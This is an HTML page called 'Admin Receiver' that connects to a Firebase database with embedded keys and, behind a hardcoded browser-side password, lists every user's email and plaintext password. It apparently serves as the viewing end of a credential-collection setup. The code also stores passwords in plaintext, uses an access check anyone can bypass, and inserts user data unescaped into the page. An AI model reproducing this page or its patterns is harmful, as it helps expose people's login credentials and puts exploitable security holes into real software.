<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Admin Receiver | NikhilSpace</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <style>
    body {
      background: linear-gradient(180deg, #0d1117 0%, #1c2530 100%);
      color: #a7f3d0;
      min-height: 100vh;
      display: flex;
      flex-direction: column;
      align-items: center;
      padding: 40px 20px;
      font-family: 'Rajdhani', sans-serif;
    }

    .container {
      max-width: 900px;
      width: 100%;
      background: rgba(255, 255, 255, 0.05);
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 12px;
      padding: 30px;
      box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
    }

    h1 {
      text-align: center;
      font-size: 2.8em;
      margin-bottom: 20px;
      color: #60a5fa;
    }

    .hidden {
      display: none;
    }

    input[type="password"] {
      padding: 12px;
      width: 100%;
      max-width: 300px;
      font-size: 1em;
      margin-bottom: 20px;
      border-radius: 8px;
      border: none;
      background: #1e293b;
      color: #f0f9ff;
      text-align: center;
    }

    button {
      padding: 10px 20px;
      font-size: 1.1em;
      border: none;
      border-radius: 10px;
      background: linear-gradient(135deg, #a855f7, #6366f1);
      color: white;
      cursor: pointer;
      transition: all 0.2s ease-in-out;
    }

    button:hover {
      transform: translateY(-3px);
    }

    .data-box {
      margin-top: 20px;
      padding: 15px;
      border: 1px solid rgba(255, 255, 255, 0.1);
      border-radius: 10px;
      background: rgba(0, 0, 0, 0.3);
      margin-bottom: 15px;
    }

    .label {
      font-weight: bold;
      color: #a855f7;
      margin-bottom: 5px;
    }

    .value {
      word-break: break-word;
    }
  </style>
</head>

<body>

  <div class="container">
    <h1>Admin Access</h1>
    <input type="password" id="adminPass" placeholder="Enter Admin Password" />
    <button onclick="checkPassword()">Access Data</button>

    <div id="dataSection" class="hidden">
      <h2>User Credentials</h2>
      <div id="credentialsList"></div>
    </div>
  </div>

  <script type="module">
    import { initializeApp } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-app.js";
    import { getDatabase, ref, onValue } from "https://www.gstatic.com/firebasejs/9.23.0/firebase-database.js";

    const firebaseConfig = {
      apiKey: "AIzaSyDaTurSbn-e8roa7o9DeAzEDAb_ZETBu3I",
      authDomain: "comment-app-eae1d.firebaseapp.com",
      databaseURL: "https://comment-app-eae1d-default-rtdb.firebaseio.com",
      projectId: "comment-app-eae1d",
      storageBucket: "comment-app-eae1d.appspot.com",
      messagingSenderId: "1085942013485",
      appId: "1:1085942013485:web:8b73425849e72db191e2a4",
      measurementId: "G-WF0852Z57K"
    };

    const app = initializeApp(firebaseConfig);
    const db = getDatabase(app);
    const credentialsRef = ref(db, "users");

    function checkPassword() {
      const pass = document.getElementById("adminPass").value;
      if (pass === "9103") {
        document.getElementById("dataSection").classList.remove("hidden");
        loadData();
      } else {
        alert("Wrong password!");
      }
    }

    function loadData() {
      const output = document.getElementById("credentialsList");
      output.innerHTML = "<p>Loading...</p>";

      onValue(credentialsRef, (snapshot) => {
        const data = snapshot.val();
        output.innerHTML = "";
        if (data) {
          Object.values(data).forEach((user, index) => {
            const div = document.createElement("div");
            div.className = "data-box";
            div.innerHTML = `
              <div class="label">Email:</div>
              <div class="value">${user.email}</div>
              <div class="label">Password:</div>
              <div class="value">${user.password}</div>
              <div class="label">Joined:</div>
              <div class="value">${user.joined}</div>
            `;
            output.appendChild(div);
          });
        } else {
          output.innerHTML = "<p>No data found.</p>";
        }
      });
    }
  </script>

</body>
</html>
